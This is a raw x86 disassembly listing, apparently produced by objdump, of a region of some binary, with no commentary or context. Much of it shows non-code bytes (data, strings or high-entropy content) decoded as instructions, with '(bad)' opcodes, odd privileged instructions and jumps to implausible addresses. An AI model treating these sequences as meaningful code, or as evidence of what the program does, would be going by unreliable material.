  41eacc:	ds dec edi
  41eace:	inc    ecx
  41eacf:	dec    edi
  41ead0:	cmp    ecx,DWORD PTR [edi+0x32]
  41ead3:	dec    edi
  41ead4:	cmp    DWORD PTR [edi+0x1e],ecx
  41ead7:	add    bl,BYTE PTR [edi]
  41ead9:	add    ecx,DWORD PTR [edi]
  41eadb:	adc    ecx,DWORD PTR [eax+edx*1]
  41eade:	jl     0x41eb00
  41eae0:	jge    0x41eb03
  41eae2:	aas    
  41eae3:	dec    edi
  41eae4:	add    BYTE PTR [eax],al
  41eae6:	outs   dx,BYTE PTR ds:[esi]
  41eae7:	jmp    0xeba3eb2d
  41eaec:	inc    ecx
  41eaed:	add    BYTE PTR [edx-0x15],ch
  41eaf0:	inc    ecx
  41eaf1:	add    BYTE PTR [edx],ch
  41eaf3:	in     eax,dx
  41eaf4:	inc    ecx
  41eaf5:	add    BYTE PTR [esi+0x1a0041ec],cl
  41eafb:	in     eax,dx
  41eafc:	inc    ecx
  41eafd:	add    BYTE PTR [edx-0x15],cl
  41eb00:	inc    ecx
  41eb01:	add    BYTE PTR [esi-0x15],cl
  41eb04:	inc    ecx
  41eb05:	add    BYTE PTR [edx],dl
  41eb07:	in     eax,dx
  41eb08:	inc    ecx
  41eb09:	add    BYTE PTR [edx-0x4effbe15],dh
  41eb0f:	test   eax,0xbab8f89c
  41eb14:	pushf  
  41eb15:	clc    
  41eb16:	data16 jmp 0x41eb5a
  41eb19:	add    BYTE PTR [edx-0x14],cl
  41eb1c:	inc    ecx
  41eb1d:	add    BYTE PTR [esi-0x14],bl
  41eb20:	inc    ecx
  41eb21:	add    BYTE PTR [edx-0x14],ch
  41eb24:	inc    ecx
  41eb25:	add    BYTE PTR [edx-0x14],bh
  41eb28:	inc    ecx
  41eb29:	add    BYTE PTR [esi+0x6a0041eb],bl
  41eb2f:	jmp    0xebffeb75
  41eb34:	inc    ecx
  41eb35:	add    BYTE PTR [esi+0x2e0041eb],ch
  41eb3b:	in     eax,dx
  41eb3c:	inc    ecx
  41eb3d:	add    BYTE PTR [eax],bh
  41eb3f:	test   DWORD PTR [eax+edi*8-0x7ee8f463],ebx
  41eb46:	jb     0x41eb33
  41eb48:	inc    ecx
  41eb49:	add    BYTE PTR [edx-0x717ee9e4],bl
  41eb4f:	or     eax,0x705
  41eb54:	inc    eax
  41eb55:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  41eb59:	fst    QWORD PTR [ebp-0x59]
  41eb5c:	inc    edx
  41eb5d:	add    BYTE PTR [edx+0x68],dh
  41eb60:	inc    ebp
  41eb61:	inc    ecx
  41eb62:	mov    ?,edx
  41eb64:	jne    0x41ebc8
  41eb66:	mov    gs,ebp
  41eb68:	inc    BYTE PTR [edi]
  41eb6a:	mov    edi,0x5a05a3fa
  41eb6f:	jmp    0x41ebb2
  41eb71:	add    BYTE PTR [ecx],bh
  41eb73:	xchg   ebp,eax
  41eb74:	pushf  
  41eb75:	clc    
  41eb76:	cmp    DWORD PTR [esi-0x6ac50764],edx
  41eb7c:	pushf  
  41eb7d:	clc    
  41eb7e:	cmp    edx,DWORD PTR [ebp-0x6ac30764]
  41eb84:	pushf  
  41eb85:	clc    
  41eb86:	cmp    eax,0x3ef89c95
  41eb8b:	xchg   ebp,eax
  41eb8c:	pushf  
  41eb8d:	clc    
  41eb8e:	aas    
  41eb8f:	xchg   ebp,eax
  41eb90:	pushf  
  41eb91:	clc    
  41eb92:	and    BYTE PTR [ebp-0x6ade0764],dl
  41eb98:	pushf  
  41eb99:	clc    
  41eb9a:	sub    BYTE PTR [ebp-0x6130764],dl
  41eba0:	add    esp,DWORD PTR [eax+0x62]
  41eba3:	jmp    0x726bebe9
  41eba8:	inc    edx
  41eba9:	add    BYTE PTR [ecx+0x49],bl
  41ebac:	imul   di,WORD PTR [eax],0xff85
  41ebb0:	pushf  
  41ebb1:	clc    
  41ebb2:	popf   
  41ebb3:	jmp    0xb54f308
  41ebb8:	add    BYTE PTR [eax],al
  41ebba:	pop    esi
  41ebbb:	jmp    0xbdcec01
  41ebc0:	add    al,0xe
	...
  41ebf2:	add    BYTE PTR [eax],dl
  41ebf4:	inc    eax
  41ebf5:	add    BYTE PTR [esi-0x7e],cl
  41ebf8:	inc    edx
  41ebf9:	add    BYTE PTR [eax],al
  41ebfb:	add    BYTE PTR [eax],al
  41ebfd:	add    BYTE PTR [ecx+0x0],cl
  41ec00:	inc    esp
  41ec01:	add    BYTE PTR [ecx+0x0],ch
  41ec04:	add    BYTE PTR fs:[ebx+0x0],cl
  41ec08:	dec    edx
  41ec09:	add    BYTE PTR [ebx+0x0],cl
  41ec0c:	dec    edx
  41ec0d:	add    BYTE PTR [eax+eax*1+0x6b],al
  41ec11:	add    BYTE PTR [eax+eax*1+0x6a],ch
  41ec15:	add    BYTE PTR [eax+eax*1+0x4c],al
  41ec19:	add    BYTE PTR [ecx+0x0],cl
  41ec1c:	inc    esp
  41ec1d:	add    BYTE PTR [eax+eax*1+0x49],cl
  41ec21:	add    BYTE PTR [ebp+0x0],dl
  41ec24:	dec    edx
  41ec25:	add    BYTE PTR [ebx+0x0],cl
  41ec28:	inc    esp
  41ec29:	add    BYTE PTR [eax+eax*1+0x4a],cl
  41ec2d:	add    BYTE PTR [ebx+0x0],cl
  41ec30:	dec    eax
  41ec31:	add    BYTE PTR [eax+eax*1+0x4a],al
  41ec35:	add    BYTE PTR [eax],al
  41ec37:	add    BYTE PTR [eax],al
  41ec39:	add    dh,bh
  41ec3b:	jmp    0x41ec7e
	...
  41ec45:	add    BYTE PTR [eax+0x59004191],bl
  41ec4b:	dec    edi
  41ec4c:	pop    edi
  41ec4d:	dec    edi
  41ec4e:	inc    eax
  41ec4f:	dec    edi
  41ec50:	inc    esp
  41ec51:	dec    edi
  41ec52:	pop    edi
  41ec53:	dec    edi
  41ec54:	inc    esi
  41ec55:	dec    edi
  41ec56:	add    DWORD PTR [edi+0x0],ecx
  41ec59:	dec    edi
  41ec5a:	xor    cl,BYTE PTR [edi+0x0]
  41ec5d:	add    BYTE PTR [ebp+0x4f],bl
  41ec60:	pop    esi
  41ec61:	dec    edi
  41ec62:	pop    ebx
  41ec63:	dec    edi
  41ec64:	add    DWORD PTR [edi+0x0],ecx
  41ec67:	dec    edi
  41ec68:	xor    cl,BYTE PTR [edi+0x4f]
  41ec6b:	dec    edi
  41ec6c:	inc    ecx
  41ec6d:	dec    edi
  41ec6e:	pop    edi
  41ec6f:	dec    edi
  41ec70:	inc    eax
  41ec71:	dec    edi
  41ec72:	add    DWORD PTR [edi+0x0],ecx
  41ec75:	dec    edi
  41ec76:	xor    cl,BYTE PTR [edi+0x0]
  41ec79:	add    BYTE PTR [ecx+0x4f],al
  41ec7c:	pop    edx
  41ec7d:	dec    edi
  41ec7e:	inc    esi
  41ec7f:	dec    edi
  41ec80:	dec    ebp
  41ec81:	dec    edi
  41ec82:	push   ebx
  41ec83:	dec    edi
  41ec84:	inc    edx
  41ec85:	dec    edi
  41ec86:	pop    ebx
  41ec87:	dec    edi
  41ec88:	xor    cl,BYTE PTR [edi+0x0]
  41ec8b:	add    BYTE PTR [eax],al
  41ec8d:	add    BYTE PTR [esi+0x7d],ch
  41ec90:	outs   dx,BYTE PTR ds:[esi]
  41ec91:	lea    ebp,[esi-0x63]
  41ec94:	outs   dx,BYTE PTR ds:[esi]
  41ec95:	lods   eax,DWORD PTR ds:[esi]
  41ec96:	outs   dx,BYTE PTR ds:[esi]
  41ec97:	mov    ebp,0xdd6ecd6e
  41ec9c:	outs   dx,BYTE PTR ds:[esi]
  41ec9d:	in     eax,dx
  41ec9e:	outs   dx,BYTE PTR ds:[esi]
  41ec9f:	std    
  41eca0:	outs   dx,BYTE PTR ds:[esi]
  41eca1:	or     eax,0x2d6e1d6e
  41eca6:	outs   dx,BYTE PTR ds:[esi]
  41eca7:	cmp    eax,0x6d6e5d6e
  41ecac:	outs   dx,BYTE PTR ds:[esi]
  41ecad:	jb     0x41ed1d
  41ecaf:	jae    0x41ed1f
  41ecb1:	jo     0x41ed21
  41ecb3:	jno    0x41ed23
  41ecb5:	jbe    0x41ed25
  41ecb7:	ja     0x41ed27
  41ecb9:	je     0x41ed29
  41ecbb:	jne    0x41ed2b
  41ecbd:	mov    ch,BYTE PTR [esi-0x75]
  41ecc0:	outs   dx,BYTE PTR ds:[esi]
  41ecc1:	mov    BYTE PTR [esi-0x77],ch
  41ecc4:	outs   dx,BYTE PTR ds:[esi]
  41ecc5:	mov    gs,WORD PTR [esi+0x7c]
  41ecc8:	pop    esi
  41ecc9:	jge    0x41ed19
  41eccb:	jge    0x41ec8b
  41eccd:	jge    0x41ed2b
  41eccf:	(bad)  
  41ecd0:	jge    0x41ed42
  41ecd2:	mov    ebp,0x71736eb1
  41ecd7:	bound  ebp,QWORD PTR [edx+0x70265fc6]
  41ecdd:	add    BYTE PTR [ebp+0x17],cl
  41ece0:	mov    ebx,0x4af4bd56
  41ece5:	aaa    
  41ece6:	dec    edx
  41ece7:	jle    0x41ec86
  41ece9:	jno    0x41ed3f
  41eceb:	mov    cl,0x8
  41eced:	imul   ebp,DWORD PTR [eax+ecx*1+0x58fd7d8],0x48
  41ecf5:	xlat   BYTE PTR ds:[ebx]
  41ecf6:	lds    edx,FWORD PTR [ebx+0x7dc4114c]
  41ecfc:	ret    
  41ecfd:	fidiv  WORD PTR [edi]
  41ecff:	into   
  41ed00:	mul    BYTE PTR [esi+0x1faa3204]
  41ed06:	push   0xc5c644f1
  41ed0b:	sbb    ch,al
  41ed0d:	jno    0x41ed0f
  41ed0f:	add    BYTE PTR [eax],al
  41ed11:	add    dh,ch
  41ed13:	(bad)  [ebx+0x7]
  41ed16:	mov    edx,0x450041eb
  41ed1b:	das    
  41ed1c:	shl    BYTE PTR [edx],0xb4
  41ed1f:	rol    BYTE PTR [ecx+0x0],1
  41ed22:	inc    esi
  41ed23:	push   ebx
  41ed24:	outs   dx,DWORD PTR ds:[esi]
  41ed25:	push   ebx
  41ed26:	push   edx
  41ed27:	jmp    0x41ed6a
  41ed29:	add    BYTE PTR [esi-0x71ffbe15],dh
  41ed2f:	in     eax,dx
  41ed30:	adc    al,BYTE PTR [edi]
  41ed32:	jae    0x41ed9d
  41ed34:	inc    edx
  41ed35:	jae    0x41ed9c
  41ed37:	popa   
  41ed38:	push   ecx
  41ed39:	pop    eax
  41ed3a:	pop    ecx
  41ed3b:	outs   dx,BYTE PTR ds:[esi]
  41ed3c:	jbe    0x41edb6
  41ed3e:	jns    0x41ed94
  41ed40:	push   ecx
  41ed41:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  41ed45:	je     0x41edb6
  41ed47:	jns    0x41edb7
  41ed49:	popa   
  41ed4a:	push   esi
  41ed4b:	push   ebp
  41ed4c:	push   0x57564476
  41ed51:	dec    edx
  41ed52:	imul   edx,DWORD PTR [ebx+0x4b],0x78575065
  41ed59:	popa   
	...
  41ed6e:	jp     0x41edc4
  41ed70:	arpl   WORD PTR [ecx+0x4b],cx
  41ed73:	push   edx
  41ed74:	imul   ebp,DWORD PTR [eax+0x45],0x55487459
  41ed7b:	jp     0x41ede9
  41ed7d:	jb     0x41edd2
  41ed7f:	outs   dx,DWORD PTR ds:[esi]
  41ed80:	push   ebx
  41ed81:	inc    esi
  41ed82:	inc    edi
  41ed83:	push   0x66495949
  41ed88:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  41ed8c:	push   esi
  41ed8d:	jb     0x41edf7
  41ed8f:	add    BYTE PTR [ecx+0x43],ah
  41ed92:	push   ecx
  41ed93:	ins    BYTE PTR es:[edi],dx
  41ed94:	pop    eax
  41ed95:	ja     0x41ede4
  41ed97:	je     0x41ee0f
  41ed99:	bound  eax,QWORD PTR [ebx+eiz*2+0x0]
  41ed9d:	add    BYTE PTR [edi+0x56],dl
  41eda0:	push   esp
  41eda1:	dec    eax
  41eda2:	je     0x41edf0
  41eda4:	push   ebx
  41eda5:	jne    0x41ee12
  41eda7:	popa   
  41eda8:	jns    0x41edaa
  41edaa:	dec    edi
  41edab:	push   esp
  41edac:	dec    edi
  41edad:	dec    ebx
  41edae:	pop    edi
  41edaf:	pop    ebx
  41edb0:	dec    edi
  41edb1:	push   esp
  41edb2:	add    bl,BYTE PTR [esi]
  41edb4:	adc    ch,BYTE PTR ds:0xe9f0aeb6
  41edba:	push   eax
  41edbb:	jge    0x41edbe
  41edbd:	add    BYTE PTR [esi+0x1f000006],al
  41edc3:	repz jl 0x41eda3
  41edc6:	sub    al,BYTE PTR [ebx+0x6696ae5e]
  41edcc:	ins    DWORD PTR es:[edi],dx
  41edcd:	cwde   
  41edce:	retf   0x914b
  41edd1:	popa   
  41edd2:	xchg   ebx,eax
  41edd3:	pushf  
  41edd4:	sbb    BYTE PTR [ebx+0x8],ah
  41edd7:	out    0xe1,eax
  41edd9:	mov    cl,0x3e
  41eddb:	pop    esi
  41eddc:	pop    ds
  41eddd:	clc    
  41edde:	dec    ecx
  41eddf:	mov    al,ds:0x8ca47b9f
  41ede4:	sbb    ah,BYTE PTR [edx-0x65]
  41ede7:	sbb    BYTE PTR [edx],0x55
  41edea:	xchg   esp,eax
  41edeb:	jae    0x41ede2
  41eded:	push   ecx
  41edee:	jge    0x41ee1d
  41edf0:	sbb    DWORD PTR [eax],esi
  41edf2:	test   bl,dh
  41edf4:	push   0x54b23e37
  41edf9:	ja     0x41ee65
  41edfb:	ret    
  41edfc:	mov    ecx,0x5da3efa9
  41ee01:	cmp    DWORD PTR [ebx-0xc],esp
  41ee04:	pop    ss
  41ee05:	mov    DWORD PTR [edi-0x533bf92b],ebp
  41ee0b:	shl    DWORD PTR [eax],cl
  41ee0d:	xchg   esi,eax
  41ee0e:	mov    edi,DWORD PTR [edi+0x16]
  41ee11:	mov    ecx,0x8773091
  41ee16:	xchg   esp,eax
  41ee17:	pushf  
  41ee18:	addr16 dec eax
  41ee1a:	push   esp
  41ee1b:	in     al,dx
  41ee1c:	shl    DWORD PTR [edx+0x6e],cl
  41ee1f:	sti    
  41ee20:	rol    ah,1
  41ee22:	fdivr  st,st(1)
  41ee24:	shl    BYTE PTR [edx],0x23
  41ee27:	dec    eax
  41ee28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee29:	xchg   BYTE PTR [esi+0x6b153154],dh
  41ee2f:	add    BYTE PTR [edx-0x57d600d8],0xe8
  41ee36:	inc    ebp
  41ee37:	jmp    0x41ede9
  41ee39:	(bad)  
  41ee3a:	cmp    bl,ah
  41ee3c:	test   DWORD PTR ds:0x1e796a57,ecx
  41ee42:	test   DWORD PTR ds:0xd4b460ba,edx
  41ee48:	inc    ebx
  41ee49:	sbb    al,0xde
  41ee4b:	aas    
  41ee4c:	(bad)  
  41ee4d:	fcomip st,st(7)
  41ee4f:	jb     0x41edd4
  41ee51:	or     bh,cl
  41ee53:	stos   DWORD PTR es:[edi],eax
  41ee54:	in     al,dx
  41ee55:	mov    BYTE PTR ds:0x11fbbe8e,cl
  41ee5b:	jae    0x41eec2
  41ee5d:	shl    DWORD PTR [ebp+0x40cbaec],cl
  41ee63:	test   eax,0xef8304e7
  41ee68:	mov    cl,0xf4
  41ee6a:	adc    eax,0x4445c591
  41ee6f:	ss pop esp
  41ee71:	popa   
  41ee72:	push   esi
  41ee73:	pushf  
  41ee74:	mov    edi,ebx
  41ee76:	push   ebx
  41ee77:	pop    edx
  41ee78:	inc    esi
  41ee79:	xchg   ebx,eax
  41ee7a:	lock xchg esp,eax
  41ee7c:	ret    
  41ee7d:	xchg   esi,eax
  41ee7e:	sti    
  41ee7f:	inc    ebx
  41ee80:	bound  edi,QWORD PTR [esi]
  41ee82:	js     0x41ee0e
  41ee84:	iret   
  41ee85:	dec    ecx
  41ee86:	daa    
  41ee87:	jl     0x41ee2e
  41ee89:	mov    dl,0x19
  41ee8b:	adc    eax,0x451f4cb9
  41ee90:	lahf   
  41ee91:	ins    BYTE PTR es:[edi],dx
  41ee92:	push   0xffffffb1
  41ee94:	int3   
  41ee95:	icebp  
  41ee96:	aaa    
  41ee97:	pushf  
  41ee98:	lods   al,BYTE PTR ds:[esi]
  41ee99:	leave  
  41ee9a:	adc    edi,DWORD PTR [eax+0x65]
  41ee9d:	pop    ecx
  41ee9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee9f:	repz push ebx
  41eea1:	inc    edx
  41eea2:	and    eax,0x351a817e
  41eea7:	mov    al,0xe5
  41eeaa:	dec    esi
  41eeab:	inc    edi
  41eeac:	mov    edi,0x1b238988
  41eeb1:	sub    al,0x68
  41eeb3:	daa    
  41eeb4:	pop    eax
  41eeb5:	retf   
  41eeb6:	icebp  
  41eeb7:	(bad)  
  41eeb8:	xlat   BYTE PTR ds:[ebx]
  41eeb9:	pop    ebx
  41eeba:	cld    
  41eebb:	outs   dx,BYTE PTR ds:[esi]
  41eebc:	jb     0x41eee8
  41eebe:	sahf   
  41eebf:	adc    BYTE PTR [edi+0xdec1af7],bh
  41eec5:	cli    
  41eec6:	fisttp DWORD PTR [esi+0x0]
  41eec9:	jb     0x41eeb7
  41eecb:	sbb    DWORD PTR [edi-0x3fe8aa38],ecx
  41eed1:	loop   0x41ef13
  41eed3:	cmp    bh,BYTE PTR [edx-0x5]
  41eed6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eed7:	(bad)  
  41eed9:	jbe    0x41ef37
  41eedb:	dec    esp
  41eedc:	dec    ecx
  41eedd:	ret    
  41eede:	push   0xa2184f02
  41eee3:	xchg   ecx,eax
  41eee4:	inc    ebp
  41eee5:	jno    0x41ee78
  41eee7:	push   eax
  41eee8:	cmp    ecx,DWORD PTR [eax+0x132cdcf3]
  41eeee:	push   eax
  41eeef:	push   ebp
  41eef0:	mov    ebx,0x2e534abb
  41eef5:	call   0x7a647097
  41eefa:	sbb    BYTE PTR [ebx],al
  41eefc:	ds inc esi
  41eefe:	adc    DWORD PTR [eax-0xf],ecx
  41ef01:	ret    0x19b2
  41ef04:	fldpi  
  41ef06:	xor    ebp,DWORD PTR [ebx-0x744c6abd]
  41ef0c:	xchg   ecx,eax
  41ef0d:	cmp    edx,eax
  41ef0f:	inc    edx
  41ef10:	mov    bl,0x1e
  41ef12:	popf   
  41ef13:	into   
  41ef14:	or     DWORD PTR ds:0xf8daed16,0x9901a874
  41ef1e:	push   ebp
  41ef1f:	mov    DWORD PTR [ecx],edi
  41ef21:	(bad)  
  41ef23:	adc    eax,0x1c30c4cc
  41ef28:	sub    al,0xe3
  41ef2a:	fcmovne st,st(4)
  41ef2c:	jb     0x41eee9
  41ef2e:	dec    esp
  41ef2f:	shl    BYTE PTR [ebx],cl
  41ef31:	push   ecx
  41ef32:	adc    eax,0x86d4f7e0
  41ef37:	enter  0x946,0x9b
  41ef3b:	(bad)  
  41ef3c:	push   0xffffffd1
  41ef3e:	mov    esp,0x47baefa8
  41ef43:	mov    esi,0x7de87bd8
  41ef48:	pop    eax
  41ef49:	adc    eax,0xb648207f
  41ef4e:	fidivr DWORD PTR [esi]
  41ef50:	std    
  41ef51:	lds    esi,FWORD PTR [esi+0x2f1b328d]
  41ef57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef58:	scas   al,BYTE PTR es:[edi]
  41ef59:	fld    st(0)
  41ef5b:	mov    dh,0x65
  41ef5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef5e:	outs   dx,DWORD PTR ds:[esi]
  41ef5f:	stos   BYTE PTR es:[edi],al
  41ef60:	cmp    BYTE PTR [edi-0x11a4b633],bl
  41ef66:	xor    dh,dl
  41ef68:	scas   eax,DWORD PTR es:[edi]
  41ef69:	lds    ebx,FWORD PTR [edi+0x74fd69ae]
  41ef6f:	xchg   esp,eax
  41ef70:	add    ah,BYTE PTR [eax+0x13fa6a44]
  41ef76:	dec    ebx
  41ef77:	inc    esp
  41ef78:	imul   esi,DWORD PTR [eax+0x47dd52e4],0x10
  41ef7f:	sbb    BYTE PTR [ebx-0x28],dh
  41ef82:	neg    BYTE PTR [ecx+0x41738201]
  41ef88:	or     edi,DWORD PTR [eax]
  41ef8a:	dec    esp
  41ef8b:	ss ret 0x323d
  41ef8f:	or     BYTE PTR [esp+esi*4-0x5b],al
  41ef93:	adc    eax,0xa282adba
  41ef98:	call   0xe76483a1
  41ef9d:	sub    DWORD PTR [eax+ebx*4],0x42
  41efa1:	sub    BYTE PTR [ecx+0x30],al
  41efa4:	pop    ecx
  41efa5:	repz cwde 
  41efa7:	xchg   DWORD PTR [eax-0x179e066c],ecx
  41efad:	loope  0x41ef8a
  41efaf:	cld    
  41efb0:	xor    BYTE PTR [edx-0x2c],0x81
  41efb4:	(bad)  
  41efb5:	cmp    DWORD PTR [ebp+0x36],ebp
  41efb8:	add    al,dh
  41efba:	movlps xmm7,QWORD PTR [ebx+edi*1]
  41efbe:	xor    BYTE PTR [ebp+0x4856bdcd],cl
  41efc4:	sbb    BYTE PTR ds:[eax],bh
  41efc7:	mov    cl,0x28
  41efc9:	push   esp
  41efca:	cs push edi
  41efcc:	jmp    0x3113:0x964669e5
  41efd3:	push   0x239c11e8
  41efd8:	not    DWORD PTR [edi+eiz*4+0x3e]
  41efdc:	mov    ebx,0xa3e22ac2
  41efe1:	test   DWORD PTR [eax+0x56],esp
  41efe4:	xor    DWORD PTR [edx+0x5b],eax
  41efe7:	mov    cl,0x54
  41efe9:	lods   eax,DWORD PTR ds:[esi]
  41efea:	(bad)  
  41efec:	dec    edx
  41efed:	mov    al,ds:0x75166e36
  41eff2:	dec    esi
  41eff3:	xchg   esp,eax
  41eff4:	int3   
  41eff5:	mov    eax,ds:0xcf2c0a17
  41effa:	sbb    ch,BYTE PTR [ebp+0x59d93530]
  41f000:	sub    edi,eax
  41f002:	test   al,0x8b
  41f004:	jb     0x41f059
  41f006:	mov    esp,0xb732ab29
  41f00b:	cmp    al,0xbe
  41f00d:	test   edx,edi
  41f00f:	push   esp
  41f010:	inc    edi
  41f011:	xchg   esi,eax
  41f012:	sbb    al,0x1a
  41f014:	mov    esi,0xade9918b
  41f019:	lods   al,BYTE PTR ds:[esi]
  41f01a:	(bad)  
  41f01b:	(bad)  
  41f01c:	jmp    0xc84844fb
  41f021:	les    edx,FWORD PTR [eax-0x69]
  41f024:	cmp    eax,0x3bca1385
  41f029:	jbe    0x41f048
  41f02b:	adc    al,0x19
  41f02d:	popa   
  41f02e:	adc    BYTE PTR [eax+0x4e79f6f9],dl
  41f034:	sbb    BYTE PTR [esp+esi*1-0x61],dl
  41f038:	push   ss
  41f039:	sbb    DWORD PTR [ecx],esp
  41f03b:	cmp    al,BYTE PTR [eax-0x6635a9f7]
  41f041:	test   DWORD PTR [ebx],eax
  41f043:	and    eax,0x7292af38
  41f048:	loop   0x41efd7
  41f04a:	test   eax,0xeef92e20
  41f04f:	xor    eax,0x67dd0254
  41f054:	call   0x2322:0x27626667
  41f05b:	pusha  
  41f05c:	mov    esp,0x956f5265
  41f061:	sbb    al,0x2
  41f063:	stos   DWORD PTR es:[edi],eax
  41f064:	test   esp,ebp
  41f066:	fcomi  st,st(0)
  41f068:	push   ds
  41f069:	ins    DWORD PTR es:[edi],dx
  41f06a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f06b:	call   0x1ed5ed52
  41f070:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f071:	mov    bh,0x11
  41f073:	icebp  
  41f074:	stos   DWORD PTR es:[edi],eax
  41f075:	rcr    DWORD PTR [eax+0xf3f401e],cl
  41f07b:	pop    ax
  41f07d:	out    dx,eax
  41f07e:	pusha  
  41f07f:	jno    0x41f04c
  41f081:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f082:	(bad)  
  41f083:	cwde   
  41f084:	je     0x41f0e0
  41f086:	ret    0x9f29
  41f089:	and    bh,BYTE PTR [ebp+0x5cad72aa]
  41f08f:	or     DWORD PTR [ebx+eiz*1-0x64],edi
  41f093:	outs   dx,BYTE PTR ds:[esi]
  41f094:	out    0x1a,eax
  41f096:	adc    al,BYTE PTR [ebx]
  41f098:	dec    eax
  41f099:	mov    eax,0xf2e30878
  41f09e:	jo     0x41f0b3
  41f0a0:	repnz imul esi,DWORD PTR [ecx-0x644ce762],0x2aee0127
  41f0ab:	sbb    DWORD PTR [edx+0x43],eax
  41f0ae:	aaa    
  41f0af:	xor    ebx,DWORD PTR [edx]
  41f0b1:	pop    ds
  41f0b2:	mov    dh,0xec
  41f0b4:	or     ecx,ecx
  41f0b6:	jns    0x41f121
  41f0b8:	(bad)  
  41f0b9:	sbb    dh,BYTE PTR [ebx]
  41f0bb:	fwait
  41f0bc:	out    0x95,al
  41f0be:	jg     0x41f100
  41f0c0:	inc    ebx
  41f0c1:	int    0x1b
  41f0c3:	mov    DWORD PTR ds:0x90e806d,0xf3c691
  41f0cd:	sub    eax,esi
  41f0cf:	or     BYTE PTR [edi-0x78],bh
  41f0d2:	nop
  41f0d3:	pop    ebp
  41f0d4:	rcr    BYTE PTR [edx+0x9],1
  41f0d7:	mov    ecx,0xab1ce4e2
  41f0dc:	mov    ecx,0xe6d83937
  41f0e1:	repz cmp edx,DWORD PTR [esi+0x48f4ffe6]
  41f0e8:	push   edx
  41f0e9:	xchg   esi,eax
  41f0ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0eb:	nop    esp
  41f0ee:	add    ecx,esi
  41f0f0:	out    dx,eax
  41f0f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f0f2:	les    eax,FWORD PTR [eax-0x4c792c61]
  41f0f8:	pop    esp
  41f0f9:	xor    eax,0x76ccae6b
  41f0fe:	rcl    DWORD PTR [eax+0x31172819],cl
  41f104:	push   ds
  41f105:	mov    bl,0x78
  41f107:	inc    si
  41f109:	nop
  41f10a:	xor    ebp,DWORD PTR ds:0x553a57cb
  41f110:	outs   dx,BYTE PTR ds:[esi]
  41f111:	add    DWORD PTR [ebp-0x79],0xc6bfa4d
  41f118:	push   edi
  41f119:	stc    
  41f11a:	adc    al,0xfb
  41f11c:	xor    DWORD PTR [edx],0x655bf0d0
  41f122:	packsswb mm1,QWORD PTR [edi-0x53f19952]
  41f129:	sbb    bl,BYTE PTR [edx+0x7170d20e]
  41f12f:	(bad)  
  41f131:	jmp    0x267d0e54
  41f136:	inc    esi
  41f137:	adc    BYTE PTR [ebp-0x29],dl
  41f13a:	mov    bh,0x80
  41f13c:	fcom   DWORD PTR ds:0x369b203f
  41f142:	call   0x7cea09fc
  41f147:	xor    al,0x36
  41f149:	inc    edx
  41f14a:	push   ebp
  41f14b:	std    
  41f14c:	addr16 cmp eax,0xbf340cc7
  41f152:	mov    ch,0x36
  41f154:	dec    ebp
  41f155:	inc    ebp
  41f156:	in     eax,0x7e
  41f158:	add    bh,BYTE PTR [eax+0x3d23fb3b]
  41f15e:	mov    ah,0xb4
  41f160:	fiadd  DWORD PTR [edx+0x60]
  41f163:	cmp    BYTE PTR [edx+0x3aa15458],0xb3
  41f16a:	mov    DWORD PTR [ecx+0x3a],esi
  41f16d:	(bad)  
  41f170:	sbb    eax,ecx
  41f172:	cs mov ebx,0xc8e251e2
  41f178:	pop    ebp
  41f179:	cmp    DWORD PTR [eax+0xde804f3],ebx
  41f17f:	loop   0x41f1ab
  41f181:	xor    eax,0x149ee10c
  41f186:	dec    edi
  41f187:	(bad)  
  41f188:	or     eax,0x349eb397
  41f18d:	mov    eax,ds:0x4a2e0e9e
  41f192:	sbb    al,0x98
  41f194:	daa    
  41f195:	adc    al,0x6b
  41f197:	(bad)  
  41f198:	jecxz  0x41f15e
  41f19a:	push   eax
  41f19b:	or     al,0x1d
  41f19d:	mov    ebp,0x5db0146f
  41f1a2:	sub    BYTE PTR [esi],al
  41f1a4:	add    bh,BYTE PTR [edi+0x612caa1d]
  41f1aa:	cs dec edi
  41f1ac:	std    
  41f1ad:	add    BYTE PTR [ebp-0x70b1cfb],bl
  41f1b3:	and    al,0xcf
  41f1b5:	out    0xdb,al
  41f1b7:	inc    eax
  41f1b8:	xchg   ebp,eax
  41f1b9:	mov    cl,ah
  41f1bb:	push   edx
  41f1bc:	xor    BYTE PTR [eax],bh
  41f1be:	lods   eax,DWORD PTR ds:[esi]
  41f1bf:	cdq    
  41f1c0:	push   esp
  41f1c1:	arpl   WORD PTR [edi],dx
  41f1c3:	xchg   ebp,eax
  41f1c4:	fstp   DWORD PTR [ebx+0x3a0b267b]
  41f1ca:	int    0xfe
  41f1cc:	xor    dh,BYTE PTR [ebx+0xd]
  41f1cf:	push   edi
  41f1d0:	jnp    0x41f193
  41f1d2:	or     ch,BYTE PTR [edi+0xd]
  41f1d5:	add    BYTE PTR [ebp+ecx*2-0x60],0x10
  41f1da:	sti    
  41f1db:	mov    ds:0x9e1938b8,eax
  41f1e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f1e1:	out    0x50,al
  41f1e3:	popa   
  41f1e4:	adc    BYTE PTR ds:[ecx],0xe7
  41f1e8:	lds    ecx,FWORD PTR ds:0x623138e6
  41f1ee:	lods   al,BYTE PTR ds:[esi]
  41f1ef:	in     eax,dx
  41f1f0:	sahf   
  41f1f1:	jbe    0x41f1c2
  41f1f3:	lds    edx,FWORD PTR [eiz*8+0x686ecdb0]
  41f1fa:	mov    al,0x23
  41f1fc:	adc    dl,BYTE PTR [edx-0x5dce8bd9]
  41f202:	push   cs
  41f203:	inc    ebx
  41f204:	or     ah,bl
  41f206:	clc    
  41f207:	mov    DWORD PTR [edx+0x20ee2caf],0x542e8299
  41f211:	cvtps2pi mm2,QWORD PTR [ebp-0x742f8a57]
  41f218:	inc    ecx
  41f219:	mov    esp,0xdf653038
